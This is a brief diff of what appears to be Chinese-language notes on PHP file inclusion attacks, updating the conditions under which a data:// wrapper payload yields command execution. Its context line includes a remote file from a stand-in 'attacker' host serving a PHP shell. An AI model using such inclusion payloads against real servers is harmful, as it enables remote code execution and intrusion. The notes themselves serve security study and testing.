@@ -1116,7 +1116,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
   ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
   ~~~
 
-  需要 `allow_url_include=On` 。
+  命令执行（php版本大于等于5.2，`allow_url_include`和`allow_url_fopen`都为`on`的状态)
 
 + 利用XSS执行
 
